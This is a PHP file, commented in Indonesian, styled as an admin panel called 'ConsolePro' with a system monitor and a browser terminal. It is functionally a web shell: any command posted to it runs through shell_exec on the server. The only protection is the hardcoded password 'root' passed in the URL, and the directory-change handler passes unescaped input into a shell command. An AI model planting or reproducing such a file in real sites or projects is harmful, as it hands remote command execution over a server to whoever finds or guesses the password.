<?php
session_start();

/** * CONFIG & SECURITY */
$password = 'root'; // GANTI INI!
$version = "4.5 PRO";

// API untuk Real-time Data
if (isset($_GET['api']) && $_GET['p'] === $password) {
    header('Content-Type: application/json');
    $load = function_exists('sys_getloadavg') ? sys_getloadavg() : [0, 0, 0];
    
    // Logika RAM (Linux focus)
    $ram_usage = "N/A";
    if (strpos(PHP_OS, 'WIN') === false) {
        $free = shell_exec('free -m');
        if ($free) {
            $lines = explode("\n", trim($free));
            $stats = preg_split('/\s+/', $lines[1]);
            // RAM: Used / Total
            $ram_usage = $stats[2] . " MB / " . $stats[1] . " MB";
        }
    } else {
        $ram_usage = "Windows System";
    }

    echo json_encode([
        'waktu' => date('H:i:s'),
        'load' => $load[0],
        'ram' => $ram_usage,
        'disk' => round(disk_free_space("/") / (1024*1024*1024), 2) . " GB Free"
    ]);
    exit;
}

if (!isset($_GET['p']) || $_GET['p'] !== $password) {
    die("<body style='background:#0d1117;color:red;padding:50px;font-family:monospace;'><h2>[!] ACCESS DENIED</h2>Sistem Keamanan Aktif.</body>");
}

if (!isset($_SESSION['cwd'])) $_SESSION['cwd'] = getcwd();
if (!isset($_SESSION['history'])) $_SESSION['history'] = [];
$current_page = $_GET['tab'] ?? 'terminal';

/** * TERMINAL LOGIC */
$output = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['cmd'])) {
    $command = trim($_POST['cmd']);
    if (!in_array($command, $_SESSION['history'])) {
        $_SESSION['history'][] = $command;
    }

    if (preg_match('/^cd\s+(.+)/', $command, $matches)) {
        $target = $matches[1];
        $check_path = shell_exec("cd " . escapeshellarg($_SESSION['cwd']) . " && cd $target && pwd 2>&1");
        if ($check_path && $check_path[0] === '/') {
            $_SESSION['cwd'] = trim($check_path);
            $output = "Success: Directory changed to " . $_SESSION['cwd'];
        } else { $output = "Error: Folder tidak ditemukan."; }
    } else {
        $final_cmd = "cd " . escapeshellarg($_SESSION['cwd']) . " && $command 2>&1";
        $output = shell_exec($final_cmd);
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>ConsolePro v<?php echo $version; ?></title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        :root {
            --bg-main: #0d1117; --bg-sec: #161b22; --border: #30363d;
            --text: #c9d1d9; --accent: #58a6ff; --green: #39ff14;
        }
        
        /* Fixed Layout */
        html, body { height: 100%; margin: 0; padding: 0; }
        body { 
            display: flex; 
            flex-direction: column; 
            background: var(--bg-main); 
            color: var(--text); 
            font-family: 'Segoe UI', system-ui, sans-serif; 
        }
        
        /* Header & Logo */
        header { 
            background: var(--bg-sec); 
            padding: 15px 30px; 
            border-bottom: 1px solid var(--border); 
            display: flex; 
            justify-content: space-between; 
            align-items: center;
        }
        .logo-box { display: flex; align-items: center; gap: 12px; }
        .logo-icon { 
            width: 32px; height: 32px; background: var(--accent); 
            border-radius: 8px; display: flex; align-items: center; 
            justify-content: center; color: var(--bg-main); font-weight: 900;
        }
        .logo-text { font-weight: bold; font-size: 20px; color: #fff; letter-spacing: -0.5px; }

        /* Navigation */
        nav { display: flex; background: var(--bg-sec); padding: 0 30px; border-bottom: 1px solid var(--border); }
        nav a { padding: 15px 20px; text-decoration: none; color: #8b949e; font-size: 14px; transition: 0.2s; }
        nav a:hover { color: #fff; }
        nav a.active { color: var(--accent); border-bottom: 2px solid var(--accent); font-weight: bold; }

        /* Content Area */
        .main-content { flex: 1; padding: 30px; max-width: 1200px; margin: 0 auto; width: 100%; box-sizing: border-box; }
        
        /* Grid & Components */
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 25px; }
        .card { border: 1px solid var(--border); background: var(--bg-sec); padding: 20px; border-radius: 12px; }
        .chart-container { position: relative; height: 180px; width: 100%; margin-top: 15px; }

        .label { color: #8b949e; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; }
        .value { font-size: 26px; font-weight: bold; color: var(--green); }
        
        /* Terminal UI */
        .terminal-box { background: #010409; border: 1px solid var(--border); border-radius: 8px; display: flex; flex-direction: column; height: 500px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .screen { flex: 1; padding: 20px; overflow-y: auto; font-family: 'Consolas', 'Courier New', monospace; font-size: 14px; white-space: pre-wrap; line-height: 1.5; }
        .input-area { display: flex; padding: 15px; background: #0d1117; border-top: 1px solid var(--border); align-items: center; }
        input[type="text"] { background: transparent; border: none; color: var(--green); outline: none; flex: 1; font-family: 'Consolas', monospace; font-size: 14px; }

        /* Footer */
        footer { background: var(--bg-sec); border-top: 1px solid var(--border); padding: 25px 30px; text-align: center; color: #484f58; font-size: 12px; }
        
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        td { padding: 12px 5px; border-bottom: 1px solid #21262d; font-size: 14px; }
        .status-tag { background: rgba(57, 255, 20, 0.1); color: var(--green); padding: 2px 8px; border-radius: 4px; font-size: 10px; font-weight: bold; }
    </style>
</head>
<body>

<header>
    <div class="logo-box">
        <div class="logo-icon">C</div>
        <div class="logo-text">CONSOLE<span style="color:var(--accent)">PRO</span></div>
    </div>
    <div style="font-size: 12px; text-align: right;">
        <span class="status-tag">SERVER ACTIVE</span><br>
        <span style="opacity: 0.6;">Node: <?php echo gethostname(); ?></span>
    </div>
</header>

<nav>
    <a href="?p=<?php echo $password; ?>&tab=home" class="<?php echo $current_page == 'home' ? 'active' : ''; ?>">Dashboard</a>
    <a href="?p=<?php echo $password; ?>&tab=terminal" class="<?php echo $current_page == 'terminal' ? 'active' : ''; ?>">Terminal Shell</a>
    <a href="?p=<?php echo $password; ?>&tab=status" class="<?php echo $current_page == 'status' ? 'active' : ''; ?>">System Status</a>
</nav>

<div class="main-content">
    <?php if($current_page == 'status'): ?>
        <div class="grid">
            <div class="card">
                <div class="label">Real-time CPU Load</div>
                <div id="load-val" class="value">0.00</div>
                <div class="chart-container">
                    <canvas id="loadChart"></canvas>
                </div>
            </div>
            <div class="card">
                <div class="label">Memory & Storage Information</div>
                <table>
                    <tr><td style="color:#8b949e">RAM Usage</td><td id="ram-val" style="color:var(--accent); font-weight:bold;">Fetching...</td></tr>
                    <tr><td style="color:#8b949e">Disk Available</td><td id="disk-val">...</td></tr>
                    <tr><td style="color:#8b949e">OS Context</td><td><?php echo PHP_OS . " (" . php_uname('m') . ")"; ?></td></tr>
                    <tr><td style="color:#8b949e">Web Server</td><td><?php echo $_SERVER['SERVER_SOFTWARE']; ?></td></tr>
                    <tr><td style="color:#8b949e">PHP SAPI</td><td><?php echo php_sapi_name(); ?></td></tr>
                </table>
            </div>
        </div>

    <?php elseif($current_page == 'terminal'): ?>
        <div class="terminal-box">
            <div class="screen" id="screen"><?php 
                if ($output) {
                    echo "<span style='color:var(--accent)'>$ " . htmlspecialchars($command) . "</span>\n" . htmlspecialchars($output);
                } else {
                    echo "<span style='opacity:0.4'>// Terminal initialized. Ready for commands.\n// Type 'help' or 'ls -la' to start.</span>";
                }
            ?></div>
            <form method="POST" class="input-area" id="term-form">
                <span style="color:var(--accent); margin-right:12px; font-weight:bold;">➜</span>
                <input type="text" name="cmd" id="cmd" autocomplete="off" autofocus spellcheck="false" placeholder="Enter command...">
            </form>
        </div>
        <p style="font-size: 11px; color: #484f58; margin-top: 15px;">
            <b>Shortcuts:</b> Use <span style="color:#8b949e">[&uarr;&darr;]</span> for History | Current Dir: <span style="color:var(--accent)"><?php echo $_SESSION['cwd']; ?></span>
        </p>

    <?php else: ?>
        <h2>System Overview</h2>
        <div class="grid">
            <div class="card">
                <div class="label">Session Command History</div>
                <div class="value"><?php echo count($_SESSION['history']); ?></div>
                <p style="font-size:13px; opacity:0.6;">Commands executed in this session.</p>
            </div>
            <div class="card">
                <div class="label">Quick Info</div>
                <p style="font-size:14px;">IP Address: <span style="color:var(--accent)"><?php echo $_SERVER['REMOTE_ADDR']; ?></span></p>
                <p style="font-size:14px;">PHP Version: <span style="color:var(--accent)"><?php echo PHP_VERSION; ?></span></p>
            </div>
        </div>
    <?php endif; ?>
</div>

<footer>
    <div style="margin-bottom: 8px; color: #8b949e; font-weight: bold;">CONSOLEPRO ENTERPRISE EDITION</div>
    <div>&copy; 2026 Secured Interface. Powered by Gemini Tech Engine.</div>
    <div style="margin-top: 10px; font-size: 10px; opacity: 0.5;">Authorized Access Only. All activities are monitored via server logs.</div>
</footer>

<script>
    // 1. TERMINAL HISTORY LOGIC
    const cmdInput = document.getElementById('cmd');
    if(cmdInput) {
        const history = <?php echo json_encode($_SESSION['history']); ?>;
        let hIdx = history.length;
        cmdInput.addEventListener('keydown', (e) => {
            if(e.key === 'ArrowUp') { 
                e.preventDefault(); 
                if(hIdx > 0) cmdInput.value = history[--hIdx]; 
            }
            if(e.key === 'ArrowDown') { 
                e.preventDefault(); 
                if(hIdx < history.length - 1) {
                    cmdInput.value = history[++hIdx]; 
                } else { 
                    hIdx = history.length; 
                    cmdInput.value = ''; 
                } 
            }
        });
        const sc = document.getElementById('screen');
        sc.scrollTop = sc.scrollHeight;
    }

    // 2. REAL-TIME MONITORING (CHART & RAM)
    if (document.getElementById('loadChart')) {
        const ctx = document.getElementById('loadChart').getContext('2d');
        const loadChart = new Chart(ctx, {
            type: 'line',
            data: {
                labels: [],
                datasets: [{
                    data: [],
                    borderColor: '#58a6ff',
                    backgroundColor: 'rgba(88, 166, 255, 0.1)',
                    borderWidth: 2,
                    fill: true,
                    tension: 0.4,
                    pointRadius: 0
                }]
            },
            options: { 
                responsive: true, 
                maintainAspectRatio: false,
                scales: { 
                    y: { beginAtZero: true, grid: { color: '#30363d' }, ticks: { font: { size: 10 } } },
                    x: { display: false } 
                },
                plugins: { legend: { display: false } }
            }
        });

        function updateSystemData() {
            fetch(`?p=<?php echo $password; ?>&api=1`)
                .then(res => res.json())
                .then(data => {
                    // Update Text Values
                    document.getElementById('load-val').innerText = data.load.toFixed(2);
                    document.getElementById('ram-val').innerText = data.ram;
                    document.getElementById('disk-val').innerText = data.disk;
                    
                    // Update Chart
                    loadChart.data.labels.push(data.waktu);
                    loadChart.data.datasets[0].data.push(data.load);
                    if(loadChart.data.labels.length > 25) {
                        loadChart.data.labels.shift();
                        loadChart.data.datasets[0].data.shift();
                    }
                    loadChart.update('none');
                })
                .catch(err => console.error("API Error"));
        }
        setInterval(updateSystemData, 3000); // Update every 3s
        updateSystemData();
    }
</script>
</body>
</html>
